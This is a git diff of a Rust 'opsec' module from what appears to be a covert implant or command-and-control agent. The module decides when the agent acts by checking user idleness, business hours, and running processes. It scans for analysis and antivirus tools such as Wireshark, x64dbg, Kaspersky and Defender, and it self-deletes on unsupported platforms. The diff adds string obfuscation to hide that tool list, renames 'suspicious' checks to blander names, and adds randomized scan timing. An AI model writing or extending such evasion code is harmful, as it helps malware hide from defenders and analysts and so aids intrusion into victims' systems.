@@ -1,9 +1,10 @@
-use log::{warn, debug};
+use log::{debug};
 use std::sync::Mutex;
 use chrono::Timelike;
 use std::process;
 use once_cell::sync::Lazy;
-use sysinfo::System;
+use obfstr::obfstr;
+use std::time::{Duration, Instant};
 
 // Opsec mode per default on High risk to ensure maximum security.
 // This module is responsible for detecting the current opsec level based on user activity and system state.
@@ -32,12 +33,12 @@ pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecS
     last_transition: std::time::Instant::now(),
 }));
 
-pub fn detect_opsec_level() -> OpsecLevel {
-    debug!("[OPSEC] detect_opsec_level() called");
+pub fn check_idle_level() -> OpsecLevel {
+    debug!("[OPSEC] check_idle_level() called");
     #[cfg(target_os = "windows")]
     {
-        let idle = is_user_idle_windows();
-        debug!("[OPSEC] is_user_idle_windows() returned: {}", idle);
+        let idle = check_user_idle_windows();
+        debug!("[OPSEC] check_user_idle_windows() returned: {}", idle);
         if idle {
             debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
             OpsecLevel::Low
@@ -48,8 +49,8 @@ pub fn detect_opsec_level() -> OpsecLevel {
     }
     #[cfg(target_os = "linux")]
     {
-        let idle = is_user_idle_linux();
-        debug!("[OPSEC] is_user_idle_linux() returned: {}", idle);
+        let idle = check_user_idle_linux();
+        debug!("[OPSEC] check_user_idle_linux() returned: {}", idle);
         if idle {
             debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
             OpsecLevel::Low
@@ -63,33 +64,59 @@ pub fn detect_opsec_level() -> OpsecLevel {
     #[cfg(not(any(target_os = "windows", target_os = "linux")))]
     {
         debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
-        self_delete_and_exit();
+        perform_self_cleanup();
     }
 }
 
-pub fn determine_agent_mode() -> AgentMode {
+pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
     let mut context = OpsecContext::default();
-    context.during_business_hours = is_business_hours();
-    context.suspicious_process = has_suspicious_process();
-    context.suspicious_window = has_suspicious_window();
-    context.suspicious_network = is_suspicious_network();
 
-    let idle_level = detect_opsec_level();
+    context.during_business_hours = check_business_hours();
+    let idle_level = check_idle_level();
     debug!("[OPSEC] Context: {:?}, idle_level: {:?}", context, idle_level);
 
     // Scoring: if any context signal is true, stay in FullOpsec
     let score = context.score();
     debug!("[OPSEC] Context score: {}", score);
 
-    if score >= 2 || idle_level == OpsecLevel::High {
+    // --- Adaptive interval logic ---
+    // Base interval on score, business hours, and idle state
+    let mut base_interval = config.proc_scan_interval_secs;
+
+    // More frequent checks during business hours or high score
+    if context.during_business_hours {
+        base_interval = base_interval.min(120);
+    }
+    if score >= 4 {
+        base_interval = base_interval.min(60);
+    }
+    if idle_level == OpsecLevel::Low {
+        base_interval = base_interval.max(300); // less frequent if idle
+    }
+
+    // Add random jitter (0-60s)
+    let jitter = rand::random::<u64>() % 61;
+    let adaptive_interval = base_interval + jitter;
+
+    // Actually perform the process check with adaptive interval
+    context.unusual_process = check_proc_state(adaptive_interval);
+
+    let mode = if score >= 2 || idle_level == OpsecLevel::High {
         AgentMode::FullOpsec
     } else {
         AgentMode::BackgroundOpsec
-    }
+    };
+
+    debug!(
+        "[OPSEC] Using adaptive process scan interval: {}s (score: {}, business_hours: {}, idle: {:?})",
+        adaptive_interval, score, context.during_business_hours, idle_level
+    );
+
+    mode
 }
 
 #[cfg(target_os = "windows")]
-fn is_user_idle_windows() -> bool {
+fn check_user_idle_windows() -> bool {
     use std::ptr;
     use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
     use winapi::shared::minwindef::{DWORD, FALSE};
@@ -166,19 +193,19 @@ fn is_user_idle_windows() -> bool {
 }
 
 #[cfg(not(target_os = "windows"))]
-fn is_user_idle_windows() -> bool {
-    debug!("[OPSEC] is_user_idle_windows() called on non-Windows platform.");
+fn check_user_idle_windows() -> bool {
+    debug!("[OPSEC] check_user_idle_windows() called on non-Windows platform.");
     false
 }
 
 #[cfg(target_os = "linux")]
-fn is_user_idle_linux() -> bool {
+fn check_user_idle_linux() -> bool {
     use log::{debug, error};
     use std::ffi::c_void;
     use std::ptr;
     use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};
 
-    debug!("[OPSEC] is_user_idle_linux() called");
+    debug!("[OPSEC] check_user_idle_linux() called");
 
     unsafe {
         // Open libX11
@@ -274,7 +301,7 @@ fn is_user_idle_linux() -> bool {
 }
 
 // Self delete and exit
-pub fn self_delete_and_exit() -> ! {
+pub fn perform_self_cleanup() -> ! {
     use std::env;
     use std::fs;
 
@@ -287,39 +314,60 @@ pub fn self_delete_and_exit() -> ! {
 #[derive(Default, Debug)]
 struct OpsecContext {
     during_business_hours: bool,
-    suspicious_process: bool,
-    suspicious_window: bool,
-    suspicious_network: bool,
+    unusual_process: bool,
+    unusual_window: bool,
+    unusual_network: bool,
 }
 
 impl OpsecContext {
     fn score(&self) -> u8 {
         let mut score = 0;
         if self.during_business_hours { score += 2; }
-        if self.suspicious_process { score += 2; }
-        if self.suspicious_window { score += 2; }
-        if self.suspicious_network { score += 2; }
+        if self.unusual_process { score += 2; }
+        if self.unusual_window { score += 2; }
+        if self.unusual_network { score += 2; }
         score
     }
 }
 
-fn is_business_hours() -> bool {
+fn check_business_hours() -> bool {
     let now = chrono::Local::now();
     let hour = now.hour();
     // 8am to 6pm considered business hours
     hour >= 8 && hour < 18
 }
 
-fn has_suspicious_process() -> bool {
-    let suspicious = ["wireshark", "tcpdump", "procmon", "procexp", "ida", "x64dbg", "ollydbg", "avast", "kaspersky", "defender"];
-    let sys = System::new_all();
-    for (_pid, process) in sys.processes() {
-        let name = process.name().to_string_lossy().to_lowercase();
-        if suspicious.iter().any(|s| name.contains(s)) {
-            return true;
-        }
+static PROC_SCAN_CACHE: Lazy<Mutex<(Instant, bool)>> = Lazy::new(|| Mutex::new((Instant::now() - Duration::from_secs(600), false)));
+
+pub fn check_proc_state(proc_scan_interval: u64) -> bool {
+    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
+    let now = Instant::now();
+    if now.duration_since(cache.0) < Duration::from_secs(proc_scan_interval) {
+        return cache.1;
     }
-    false
+
+    let unusual = [
+        obfstr!("wireshark").to_string(),
+        obfstr!("tcpdump").to_string(),
+        obfstr!("procmon").to_string(),
+        obfstr!("procexp").to_string(),
+        obfstr!("ida").to_string(),
+        obfstr!("x64dbg").to_string(),
+        obfstr!("ollydbg").to_string(),
+        obfstr!("avast").to_string(),
+        obfstr!("kaspersky").to_string(),
+        obfstr!("defender").to_string(),
+    ];
+
+    let sys = sysinfo::System::new_all();
+    let found = sys.processes().values().any(|process| {
+        let name = process.name().to_string_lossy().to_lowercase();
+        unusual.iter().any(|s| name.contains(s))
+    });
+
+    // Update cache
+    *cache = (now, found);
+    found
 }
 
 // TODO: Implement Sandbox detection
@@ -329,10 +377,10 @@ fn has_suspicious_process() -> bool {
 // pub fn is_debugged() -> bool { false }
 
 // Placeholder: returns false, implement with platform-specific code for real use
-fn has_suspicious_window() -> bool { false }
+//fn check_window_state() -> bool { false }
 
 // Placeholder: returns false, implement with platform-specific code for real use
-fn is_suspicious_network() -> bool { false }
+//fn check_network_state() -> bool { false }
 
 #[cfg(target_os = "windows")]
 #[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
